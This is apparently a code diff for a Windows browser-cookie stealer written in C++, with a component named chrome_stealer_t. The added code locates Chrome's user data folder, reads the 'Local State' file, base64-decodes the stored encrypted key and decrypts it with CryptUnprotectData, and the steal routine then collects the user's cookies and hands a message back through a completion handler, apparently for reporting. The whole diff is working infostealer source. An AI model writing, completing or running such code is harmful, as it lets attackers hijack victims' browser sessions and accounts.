@@ -10,6 +10,12 @@
 #include "messages/text_message.h"
 #include "messages/error_message.h"
 
+#include <boost/beast/core/detail/base64.hpp>
+
+#include <Wincrypt.h>
+
+#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
+
 net::expected<fs::path> get_browser_path()
 {
     TCHAR appdata_path[MAX_PATH];
@@ -26,7 +32,7 @@ net::expected<fs::path> get_browser_path()
     return fs::path(appdata_path) / "Google" / "Chrome" / "User Data";
 }
 
-net::expected<std::string> get_encryption_key(const fs::path& browser_path)
+net::expected<std::vector<BYTE>> get_encryption_key(const fs::path& browser_path)
 {
     fs::path local_state_path = browser_path / "Local State";
 
@@ -42,9 +48,34 @@ net::expected<std::string> get_encryption_key(const fs::path& browser_path)
         std::istreambuf_iterator<char>()};
 
     auto jcontent = json::parse(content);
-    std::string encryption_key = jcontent.at("os_crypt").at("encrypted_key").as_string().c_str();
+    std::string encryption_key64 = jcontent.at("os_crypt").at("encrypted_key").as_string().c_str();
 
-    return encryption_key;
+    std::vector<BYTE> encryption_key;
+    encryption_key.resize(beast::detail::base64::decoded_size(encryption_key64.size()), 0);
+    beast::detail::base64::decode(
+        (void*)encryption_key.data(),
+        encryption_key64.data(),
+        encryption_key64.size());
+
+    DATA_BLOB DataIn = { (DWORD)encryption_key.size() - 4, (BYTE*)encryption_key.data() + 4};
+    DATA_BLOB DataOut = {0};
+    LPWSTR pDescrOut = nullptr;
+    if(!CryptUnprotectData(&DataIn,
+        &pDescrOut,
+        nullptr,
+        nullptr,
+        nullptr,
+        0,
+        &DataOut))
+    {
+        return net::error_t("Chrome(ERROR): cant encrypt encryption key");
+    }
+
+    std::vector<BYTE> to_ret(DataOut.pbData, DataOut.pbData + DataOut.cbData);
+
+    LocalFree(DataOut.pbData);
+
+    return to_ret;
 }
 
 net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path)
@@ -114,14 +145,14 @@ asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
             {
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto browser_path, get_browser_path());
 
-                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(std::string encryption_key, get_encryption_key(browser_path));
+                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto encryption_key, get_encryption_key(browser_path));
                 DLOG("Chrome(DISPLAY): Encryption key received");
 
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path));
                 DLOG("Chrome(DISPLAY): Cookies received");
 
                 auto text_msg = std::make_unique<text_message_t>();
-                text_msg->text = encryption_key;
+                text_msg->text = "";
                 std::move(completion_handler)(std::move(text_msg));
             }, std::move(completion_handler)).detach();
         }, asio::use_awaitable
